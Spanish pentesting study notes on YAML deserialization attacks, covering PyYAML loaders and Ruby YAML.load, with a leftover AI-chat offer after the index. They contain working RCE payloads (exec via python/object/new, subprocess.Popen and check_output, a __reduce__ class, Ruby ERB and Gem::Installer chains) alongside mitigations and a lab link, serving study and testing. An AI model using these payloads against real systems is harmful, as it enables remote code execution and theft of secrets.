## 📚 Índice

- [[#🧠 Mental Model (esto lo tienes que entender sí o sí)]]
- [[#📌 ¿Dónde aparece DES-YAML en la vida real?]]
- [[#🧬 YAML no es solo texto (demostración clave)]]
- [[#🧠 Tipos de loaders en PyYAML (CLAVE)]]
- [[#🔥 Ejemplo crítico: deserialización peligrosa]]
- [[#🧪 Ejemplo básico de explotación (sleep)]]
- [[#🕰️ Versiones antiguas: `.load()` sin Loader]]
- [[#🧨 RCE avanzado con `__reduce__`]]
- [[#🧰 Generación automática de payloads]]
- [[#🧨 DES-YAML en Ruby (RCE automático)]]
- [[#🎯 Payload YAML genérico de RCE (Python)]]
- [[#🧪 Flujo práctico de explotación (pentesting)]]
- [[#🚨 Impacto real]]
- [[#🛡️ Mitigaciones reales (para reporte)]]
- [[#🧠 Cheatsheet mental final]]
- [[#🧪 Laboratorio recomendado]]


---

Si quieres, puedo:

- 🔹 convertir este índice en **formato numerado**
    
- 🔹 generar un **índice automático por secciones (nivel 2 / 3)**
    
- 🔹 crear una **plantilla estándar para TODAS tus notas de vulnerabilidades**
    
- 🔹 normalizar emojis entre SQLi / XSS / IDOR / DES
    
- 🔹 hacer versión **OSCP-only (ultra resumida)**
    

Tú dime cómo lo quieres seguir.

> **DES-YAML (YAML Deserialization Attack)** es una vulnerabilidad crítica que ocurre cuando una aplicación **deserializa YAML controlado por el usuario** usando loaders inseguros, permitiendo **ejecución de código arbitrario (RCE)**, **DoS** o **manipulación de objetos internos**.

⚠️ **No es un bug “web” clásico**.  
Es una **vulnerabilidad de lógica + lenguaje**.

---

## 🧠 Mental Model (esto lo tienes que entender sí o sí)

YAML en Python **NO es solo datos**.

YAML puede serializar y deserializar:

- tipos primitivos ✅
    
- estructuras complejas ❌
    
- objetos Python ❌❌
    
- llamadas a funciones ❌❌❌
    

👉 **Si deserializas YAML no confiable con loaders inseguros, estás ejecutando Python indirectamente.**

---

## 📌 ¿Dónde aparece DES-YAML en la vida real?

- APIs que aceptan YAML
    
- Endpoints “internos”
    
- Cargas de configuración
    
- Backends DevOps / CI
    
- Web apps educativas / labs
    
- Apps legacy en Python / Ruby
    

Ejemplo típico vulnerable:

```python
yaml.load(user_input)
```

---

## 🧬 YAML no es solo texto (demostración clave)

Ejemplo de serialización:

```python
print(yaml.dump(str("lol")))
```

Salida:

```yaml
lol
```

Ahora algo más peligroso:

```python
print(yaml.dump(tuple("lol")))
```

Salida:

```yaml
!!python/tuple
- l
- o
- l
```

👉 **Ya no es “dato”**, es **objeto Python serializado**.

Otro ejemplo:

```python
print(yaml.dump(range(1,10)))
```

Salida:

```yaml
!!python/object/apply:builtins.range
- 1
- 10
- 1
```

⚠️ Esto significa:

- YAML puede invocar funciones de `builtins`
    
- Puede reconstruir objetos
    
- Puede ejecutar lógica
    

---

## 🧠 Tipos de loaders en PyYAML (CLAVE)

|Loader|¿Peligroso?|Motivo|
|---|---|---|
|`SafeLoader`|❌ Seguro|No permite objetos|
|`safe_load()`|❌ Seguro|Usa SafeLoader|
|`FullLoader`|⚠️ Parcial|No ejecuta objetos peligrosos|
|`Loader`|❌ Inseguro|Puede ejecutar|
|`UnsafeLoader`|❌❌ Muy inseguro|RCE directo|
|`unsafe_load()`|❌❌ Muy inseguro|RCE directo|

---

## 🔥 Ejemplo crítico: deserialización peligrosa

```python
data = b'!!python/object/apply:builtins.range [1, 10, 1]'
```

### Carga insegura

```python
yaml.load(data, Loader=UnsafeLoader)
```

Resultado:

```python
range(1, 10)
```

👉 **Ejecutó código Python al deserializar**.

---

## 🧪 Ejemplo básico de explotación (sleep)

```yaml
!!python/object/apply:time.sleep [2]
```

Código vulnerable:

```python
yaml.load(data, Loader=UnsafeLoader)
```

Resultado:

- la app **se congela 2 segundos**
    
- prueba clara de **ejecución**
    

👉 Perfecto para **confirmar impacto sin romper nada**.

---

## 🕰️ Versiones antiguas: `.load()` sin Loader

En versiones viejas de PyYAML:

```python
yaml.load(data)
```

⚠️ **Esto era RCE directo**.

Payload clásico:

```yaml
!!python/object/new:str
state: !!python/tuple
  - 'print(getattr(open("flag.txt"), "read")())'
  - !!python/object/new:Warning
    state:
      update: !!python/name:exec
```

👉 Esto:

- crea un objeto
    
- invoca `exec`
    
- ejecuta código arbitrario
    

### One-liner equivalente

```yaml
!!python/object/new:str {
  state:
    !!python/tuple [
      'print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))',
      !!python/object/new:Warning {
        state: { update: !!python/name:exec }
      },
    ],
}
```

⚠️ En versiones modernas:

- `.load()` **exige Loader**
    
- `FullLoader` ya **no es vulnerable**
    

---

## 🧨 RCE avanzado con `__reduce__`

El método **más potente y elegante**.

### Clase maliciosa

```python
import subprocess

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen, ('ls',))
```

### Serialización

```python
deserialized_data = yaml.dump(Payload())
print(deserialized_data)
```

Salida YAML:

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

### Deserialización vulnerable

```python
yaml.load(deserialized_data, Loader=UnsafeLoader)
```

👉 **Ejecuta `ls` en el sistema**.

---

## 🧰 Generación automática de payloads

Herramienta:

```
https://github.com/j0lt-github/python-deserialization-attack-payload-generator
```

Uso:

```bash
python3 peas.py
```

Ejemplo de payload YAML generado:

```yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cat
  - /root/flag.txt
```

👉 Muy útil para:

- Pickle
    
- PyYAML
    
- jsonpickle
    
- ruamel.yaml
    

---

## 🧨 DES-YAML en Ruby (RCE automático)

Si la app hace:

```ruby
YAML.load(params[:data])
```

👉 **RCE INMEDIATO**.

### Payload con ERB

```yaml
--- !ruby/object:ERB
src: "<%= `id` %>"
```

### Payload más complejo

```yaml
--- !ruby/object:Gem::Installer
i: x
development: false
security_policy:
  verify_signer: !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Tempfile {}
    debug_output: &1
```

---

## 🎯 Payload YAML genérico de RCE (Python)

```yaml
"contents_of_cwd": !!python/object/apply:subprocess.check_output
- ['ls']
```

Resultado:

- ejecuta `ls`
    
- devuelve salida
    

---

## 🧪 Flujo práctico de explotación (pentesting)

```
1. Encuentras input YAML
2. Identificas loader usado
3. Pruebas sleep (impacto bajo)
4. Pruebas range / builtins
5. Pasas a RCE con subprocess
6. Documentas ejecución
```

---

## 🚨 Impacto real

- RCE completo
    
- Robo de secretos
    
- Acceso al sistema
    
- Pivoting interno
    
- DoS por consumo de recursos
    

👉 **Crítico siempre**.

---

## 🛡️ Mitigaciones reales (para reporte)

- ❌ Nunca usar `yaml.load()` sin Loader
    
- ✅ Usar `safe_load()` / `SafeLoader`
    
- ❌ No deserializar YAML no confiable
    
- ✅ Validar esquema (whitelist)
    
- ✅ Limitar recursos
    
- ✅ Sandbox / contenedores
    

---

## 🧠 Cheatsheet mental final

- YAML ≠ JSON
    
- YAML puede ejecutar Python
    
- Loader inseguro = RCE
    
- `UnsafeLoader` = muerte
    
- `safe_load()` = vida
    

---

## 🧪 Laboratorio recomendado

- **SKF-LABS DES-YAML**  
    [https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml](https://github.com/blabla1337/skf-labs/tree/master/python/DES-Yaml)
    

---

